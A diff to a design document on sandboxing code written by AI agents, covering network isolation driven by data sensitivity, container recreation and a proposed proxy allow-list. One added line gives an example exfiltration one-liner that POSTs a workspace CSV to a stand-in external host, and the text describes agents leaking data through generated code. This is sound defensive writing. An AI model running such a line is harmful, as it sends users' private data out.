@@ -6,9 +6,7 @@ This section describes the concepts and mechanisms behind sandboxed execution. T
 
 ## Why Agents Need Sandboxes
 
-Tool-based agents operate within a controlled vocabulary: each tool has defined inputs, outputs, and permissions (see the `@tool_permission` decorator in our tools module). But CodeAct agents write and run arbitrary code. A Python snippet can open files, make network requests, spawn processes, or modify the filesystem in ways that no tool permission system can anticipate.
-
-The sandbox addresses this by enforcing isolation at the infrastructure level. Rather than trying to restrict what code can do through static analysis or allow-lists (which are brittle and bypassable), the sandbox constrains the environment in which the code runs.
+A Python snippet can open files, make network requests, spawn processes, or modify the filesystem in ways that no tool permission system can anticipate. The sandbox addresses this by enforcing isolation at the infrastructure level. Rather than trying to restrict what code can do through static analysis or allow-lists (which are brittle and bypassable), the sandbox constrains the environment in which the code runs.
 
 ## Process Isolation
 
@@ -100,27 +98,76 @@ A translation layer converts between the agent-visible path (`/workspace/report.
 
 ## Network Isolation
 
-Network access is the primary exfiltration vector for code running inside a sandbox. An agent that has loaded sensitive data into its workspace could POST it to an external server. Tool permissions cannot prevent this because the code runs outside the tool framework.
+Network access is the primary exfiltration vector for code running inside a sandbox. An agent that has loaded sensitive data into its workspace could POST it to an external server. Tool permissions cannot prevent this because the code runs outside the tool framework -- a one-liner like `requests.post("https://external.com", data=open("/workspace/data.csv").read())` bypasses every permission check because it never goes through the tool-calling path.
 
 ### Binary Network Control
 
-The simplest and most auditable approach is a binary choice: the sandbox either has full network access or none at all. On bwrap, `--unshare-net` removes all network interfaces except loopback. On Docker, `network_mode="none"` does the same.
+The simplest and most auditable approach is a binary choice: the sandbox either has full network access or none at all. On bwrap, `--unshare-net` removes all network interfaces except loopback. On Docker, `network_mode="none"` does the same -- no DNS resolution, no TCP connections, no UDP traffic. The container becomes a compute island that can read and write files on its mounted workspace but cannot reach anything beyond `127.0.0.1`.
 
 There is no allow-list, no proxy, no partial access. This eliminates configuration errors and makes the security property trivial to verify.
 
-### Integration with Data Sensitivity
+### Data-Sensitivity-Driven Switching
 
-The network isolation decision can be driven by data classification. When a session processes sensitive data (flagged by connectors via a compliance layer like `PrivateData`), the sandbox automatically disables network access:
+The `PrivateData` compliance module drives the network switch. When a connector retrieves sensitive records -- patient data from a database, financial reports from an internal API -- it calls `PrivateData.add_private_dataset()` to register the dataset and its sensitivity level. The sandbox checks this state and selects the network mode accordingly:
 
 ```python
-isolate_network = session_has_private_data(user_id, session_id)
+class NetworkMode(str, Enum):
+    FULL = "bridge"
+    NONE = "none"
+
+def get_network_mode(user_id: str, session_id: str) -> NetworkMode:
+    if session_has_private_data(user_id, session_id):
+        return NetworkMode.NONE
+    return NetworkMode.FULL
 ```
 
-This is a one-way ratchet: once sensitive data enters a session, the network stays off for the session's lifetime. Sensitivity escalates but never degrades.
+This is a one-way ratchet: once sensitive data enters a session, network access never returns. The sensitivity level can escalate (from INTERNAL to CONFIDENTIAL to SECRET) but never decrease. This mirrors the real-world principle that you cannot "un-see" data -- once an agent has processed confidential records, any subsequent code it generates could embed fragments of that data in network requests.
 
-### Workspace Survival Across Recreation
+### Dynamic Container Recreation
 
-If a running sandbox must be recreated to change its network mode (for example, when private data arrives mid-session), the workspace survives because it lives on the host filesystem. The old sandbox is destroyed, a new one is created with network disabled, and the same workspace directory is mounted again. From the agent's perspective, all files are still present -- only the network has changed.
+The sandbox manager checks `get_network_mode()` on every session access and compares the result against the container's current network mode. If the required mode is more restrictive, the manager stops the container and creates a new one with the correct network configuration.
+
+The workspace directory survives this recreation because it lives on the host filesystem as a bind mount. The old sandbox is destroyed, a new one is created with network disabled, and the same workspace is mounted again. From the agent's perspective, all files are still present -- only network destinations that were previously reachable now return connection errors.
+
+For a better user experience, the system can inject a message into the agent's context when the network mode changes:
+
+```
+[SYSTEM] Network access has been restricted because private data
+entered this session. Outbound connections are blocked.
+```
+
+The agent can then decide to work with the data locally, or ask the user for guidance.
+
+### Beyond Binary: Proxy-Based Selective Connectivity
+
+The binary switch works well when data sensitivity is clear-cut, but enterprise workflows often need to combine private data with trusted external services: an internal company API, a data warehouse behind the VPN, a cloud service with a Zero Data Retention (ZDR) agreement. Cutting all network access forces the agent to stop mid-task whenever it needs to reach one of these services after private data has entered the session.
+
+A more sophisticated approach places a proxy (such as Envoy) between the container and the network. The architecture uses two Docker networks. The first is an internal network with no external route, connecting only the sandbox container and the proxy. The second is the default bridge network that gives the proxy access to the outside world. The sandbox cannot reach the internet directly; it can only reach the proxy, and the proxy decides what traffic to forward based on a platform-level whitelist.
+
+```
+                  internal network              bridge network
+                  (no gateway)                  (internet access)
+
+ +-------------+                 +-------+                    +-----------+
+ |  Sandbox    | --- HTTP(S) --> | Envoy | --- HTTP(S) -->    | Trusted   |
+ |  Container  |                 | Proxy |                    | Services  |
+ +-------------+                 +-------+                    +-----------+
+                                     |
+                                     X--- blocked -->  Untrusted destinations
+```
+
+With this proxy in place, the `NetworkMode` enum gains a third option:
+
+```python
+class NetworkMode(str, Enum):
+    FULL = "bridge"
+    PROXIED = "proxied"   # whitelist-only via proxy
+    NONE = "none"
+```
+
+The mode selection then considers the sensitivity level: PUBLIC and INTERNAL data get full access, CONFIDENTIAL data triggers proxied mode, and SECRET data triggers the full network kill. The ratchet behavior still applies.
+
+This proxy-based approach is not implemented in our POC. The binary FULL/NONE switch covers the most common scenarios and is simple to deploy and audit. The proxy pattern is presented here as a design direction for production deployments where blanket network removal is too restrictive.
 
 ## Timeout Enforcement
 
@@ -193,13 +240,25 @@ The sandbox is one layer in a defense-in-depth approach to agent security:
 2. **Sandbox isolation** constrains what the agent's generated code can do at the infrastructure level -- filesystem, network, process, and resource boundaries.
 3. **Data compliance** drives sandbox configuration automatically, tightening isolation when sensitive data enters a session.
 
-These layers are independent. Tool permissions cannot prevent code from making network requests inside a sandbox. Sandbox network isolation cannot prevent a tool from calling an external API. Together, they cover both vectors without relying on the agent's cooperation.
+These layers are independent and protect against different vectors:
+
+```
+Agent
+  |
+  |-- Tool call path
+  |     @tool_permission(CONNECT) blocks exfiltration tools
+  |
+  |-- Code execution path (sandbox)
+        Network isolation blocks network at infrastructure level
+```
+
+Neither layer depends on the other. Tool permissions cannot prevent code from making network requests inside a sandbox. Sandbox network isolation cannot prevent a tool from calling an external API. Together with the `PrivateData` compliance module that drives both layers, the system provides a coherent data protection pipeline: connectors tag data as it enters the session, tool permissions restrict the agent's tool vocabulary, and the sandbox restricts the network reach. A failure or misconfiguration in one layer does not expose data through the other.
 
 ## Design Trade-offs
 
 **One sandbox per session** simplifies lifecycle management (no shared state, no cross-session interference) but costs more resources than pooling. For strong isolation, this trade-off is worthwhile.
 
-**Binary network control** (full access or none) is less flexible than allow-lists or proxies, but eliminates configuration errors and is easy to audit.
+**Binary network control** (full access or none) is the default, with proxy-based selective connectivity available as a production extension for workflows that require it.
 
 **Pickle IPC** supports rich Python objects but introduces deserialization risks. The temp directory is short-lived and mounted read-write only for the duration of execution, limiting the attack surface.
 
